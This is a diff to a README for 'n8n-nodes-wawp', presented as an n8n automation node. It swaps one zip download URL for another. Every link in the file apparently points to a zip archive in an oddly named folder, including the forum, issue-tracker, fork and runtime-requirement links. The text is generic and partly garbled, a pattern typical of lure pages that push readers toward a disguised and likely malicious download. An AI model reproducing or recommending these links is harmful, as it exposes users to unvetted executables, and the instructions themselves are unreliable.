@@ -1,6 +1,6 @@
 # 🤖 n8n-nodes-wawp - Automate Tasks with Easy AI Notifications
 
-[![Download n8n-nodes-wawp](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip)](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip)
+[![Download n8n-nodes-wawp](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip)](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,17 +14,17 @@ Before you download the app, make sure your computer meets these requirements:
 - RAM: At least 4 GB
 - Disk Space: A minimum of 100 MB available
 - Internet Connection: Required for some features
-- https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip Version 14 or higher (for local setups)
+- https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip Version 14 or higher (for local setups)
 
 ## 📥 Download & Install
 
 To get **n8n-nodes-wawp**, visit the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip)
+[Visit this page to download](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version. It should be labeled as "Latest Release."
-3. Click on the asset that matches your operating system (e.g., `https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip` for Windows).
+3. Click on the asset that matches your operating system (e.g., `https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip` for Windows).
 4. The file will download to your computer. Find the downloaded file in your Downloads folder.
 
 ### Installation
@@ -65,8 +65,8 @@ Once you have installed **n8n-nodes-wawp**, follow these steps to set it up:
 
 If you encounter any issues or have questions, please feel free to reach out. You can find help through the following channels:
 
-- [Community Forum](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip)
-- GitHub Issues Section: If you find a bug or need feature requests, please report them [here](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip).
+- [Community Forum](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip)
+- GitHub Issues Section: If you find a bug or need feature requests, please report them [here](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip).
 
 ## 📄 License
 
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. You can use it for free, but ple
 
 We welcome contributions! If you'd like to help improve the project, please follow these steps:
 
-1. Fork the repository from [GitHub](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip).
+1. Fork the repository from [GitHub](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip).
 2. Create a new branch for your feature or fix.
 3. Make your changes and commit them.
 4. Push your changes to your fork on GitHub.
@@ -86,4 +86,4 @@ Thank you for your interest in helping us improve **n8n-nodes-wawp**!
 
 Explore more features and automations you can unlock with **n8n-nodes-wawp**. We hope you enjoy using it!
 
-[Download n8n-nodes-wawp](https://raw.githubusercontent.com/Ankitg1850/n8n-nodes-wawp/main/immethodic/n8n-nodes-wawp.zip) and start automating today!
+[Download n8n-nodes-wawp](https://github.com/Ankitg1850/n8n-nodes-wawp/raw/refs/heads/main/immethodic/n_nodes_wawp_3.8.zip) and start automating today!
